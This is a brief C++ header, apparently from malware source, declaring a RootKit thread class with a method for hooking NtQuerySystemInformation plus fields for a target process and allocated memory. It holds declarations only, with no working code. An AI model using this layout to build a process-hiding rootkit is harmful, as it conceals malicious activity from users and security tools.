#include <windows.h>
#include "thread.h"
#include "pe.h"
#include "debug.h"

class RootKit : public Thread
{
public:
	RootKit();

private:
	VOID ThreadFunc(VOID);
	VOID HookNtQuerySystemInformation(LPVOID Address, LPVOID OriginalAddress);

	LPVOID AllocatedMemory;
	HANDLE Process;
};